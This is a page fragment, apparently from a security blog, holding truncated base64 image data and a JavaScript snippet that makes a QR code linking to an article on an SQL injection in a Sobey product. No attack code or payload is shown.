G+IpvQluA3Fqd9j33fP6d7o5Ea6fKnMd9/fpXueQe+xr6tocxIcR9Z/F6lnr2fw+tw1kL67r153AYSAwPh0Q/qdbhPP6eoJqQfy63q9+P0hOHcLhiD0jv8P9/evafF3vF+Se+iJEhxH1n8HDQJ4pWpl/dwJ/PRAYnwafJIg+2zrENz/Ldd282P3iemJpZwuyBz0YufUQHYJdl9tnhub0Oy/9rwdSTdb6vhP4toGcTfsr24Q8fRC0FsLtD+H66oVqdwhjD/PVoxZc++ZFGPPVo5b+HVbW9W0Dubvp8p87gcNAnFTHWTtzcP6U3PmQOnOz+8CYg/BZvnRIZtZbHZKDYNXWgpGXVguiW9+xMlcLUn+WOQzkLLS0nzuBbSCQqcE13m0NxnrzPkVw7vecXLReLsJnPzMQrWf0Z7q+aE6Ese+dbh8RxnoIh0/cBmLzha89gTWQ157/4e7/AwAA//9v85qQAAAABklEQVQDADV6s8vrr2g4AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-Articlelist-articleExamineExport-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 